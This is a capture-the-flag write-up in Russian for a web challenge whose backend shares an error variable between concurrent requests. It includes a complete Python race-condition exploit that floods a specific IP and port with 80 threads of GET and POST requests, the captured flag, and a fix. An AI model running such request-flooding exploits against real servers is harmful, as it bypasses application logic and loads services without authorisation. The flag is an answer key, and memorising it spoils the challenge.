# Web Challenge 2: No skill just luck 

## Идея
Бэкенд делит одну переменную `err` между конкурентными запросами. Это классическая race condition.

## Шаги решения
1. Запускаем много параллельных GET-запросов.
2. Одновременно запускаем много POST с неправильным флагом.
3. Ловим момент, когда `err` перетирается в `nil`, и сервер ошибочно рендерит ветку успеха.

## Команды для выполнения (без готовых скриптов)

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install requests
```

Создай `exploit_chall2.py`:

```python
import re, threading, time, requests

URL = "http://158.160.221.45:1924/"
FLAG_RE = re.compile(r"LB\{[^<\s]+\}")
stop = False
found = None


def spam_get():
    s = requests.Session()
    global stop
    while not stop:
        try:
            s.get(URL, timeout=2)
        except Exception:
            pass


def spam_post():
    s = requests.Session()
    global stop, found
    while not stop:
        try:
            r = s.post(URL, data={"flag": "LB{nope}"}, timeout=2)
            if "Correct! Here is your flag:" in r.text:
                m = FLAG_RE.search(r.text)
                found = m.group(0) if m else r.text
                stop = True
        except Exception:
            pass


threads = []
for _ in range(40):
    t = threading.Thread(target=spam_get, daemon=True); t.start(); threads.append(t)
for _ in range(40):
    t = threading.Thread(target=spam_post, daemon=True); t.start(); threads.append(t)

start = time.time()
while time.time() - start < 30 and not stop:
    time.sleep(0.05)

print(found if found else "NOFLAG")
```

Запуск:

```bash
python3 exploit_chall2.py
```

## Флаг
```text
LB{761201b446ac76c2954db53e086d9d6d}
```

## Почему сработало
- Общая изменяемая переменная между потоками/запросами.

## Фикс
- Убрать общее состояние между запросами.
- Делать `err` только локальной переменной внутри handler.
